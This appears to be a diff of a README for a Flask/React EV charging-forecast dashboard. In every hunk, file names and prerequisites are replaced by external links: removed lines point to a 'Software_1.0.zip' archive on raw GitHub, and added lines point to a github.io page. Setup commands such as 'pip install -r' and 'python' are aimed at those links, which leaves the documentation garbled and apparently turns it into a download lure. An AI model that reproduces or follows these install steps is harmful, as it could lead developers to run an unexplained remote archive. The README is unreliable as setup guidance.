@@ -13,7 +13,7 @@ This is a EV charging station display dashboard to optimally define routes to ch
 
 ## 📋 Prerequisites
 
-- https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip (v14 or higher)
+- https://nandanarajesh25.github.io (v14 or higher)
 - Python 3.8+
 - npm or yarn
 
@@ -23,7 +23,7 @@ This is a EV charging station display dashboard to optimally define routes to ch
 
 bash
 cd backend
-pip install -r https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip
+pip install -r https://nandanarajesh25.github.io
 
 
 ### 2. Install React Dependencies (Frontend)
@@ -36,7 +36,7 @@ npm install
 
 bash
 cd backend
-python https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip
+python https://nandanarajesh25.github.io
 
 
 The Flask API will run on http://localhost:5000
@@ -52,8 +52,8 @@ The React app will run on http://localhost:3000
 ## 🏗️ Architecture
 
 ### Backend (Flask API)
-- **https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip**: Generates simulated EV charging data
-- **https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip**: Flask REST API with all forecasting endpoints
+- **https://nandanarajesh25.github.io**: Generates simulated EV charging data
+- **https://nandanarajesh25.github.io**: Flask REST API with all forecasting endpoints
 - **Endpoints**:
   - /api/stations - Get all stations
   - /api/forecast - Get demand forecast
@@ -94,13 +94,13 @@ The React app will run on http://localhost:3000
 ## 🔧 Customization
 
 ### Adding New Stations
-Edit https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip and add new station data to the stations array.
+Edit https://nandanarajesh25.github.io and add new station data to the stations array.
 
 ### Modifying Capacity Limits
-Update https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip and modify the station_capacity dictionary.
+Update https://nandanarajesh25.github.io and modify the station_capacity dictionary.
 
 ### Styling Changes
-Update the theme in https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip or individual component styles.
+Update the theme in https://nandanarajesh25.github.io or individual component styles.
 
 ## 📱 Usage
 
@@ -125,7 +125,7 @@ Deploy the Flask app to your preferred cloud service (AWS, Azure, Heroku, etc.)
 ## 📈 Data Flow
 
 1. Frontend makes API calls to Flask backend
-2. Backend generates/processes EV data using https://raw.githubusercontent.com/NandanaRajesh25/infosys/main/src/components/Software_1.0.zip
+2. Backend generates/processes EV data using https://nandanarajesh25.github.io
 3. Prophet model creates forecasts
 4. Results are formatted and sent back to frontend
 5. React components render the data with interactive visualizations
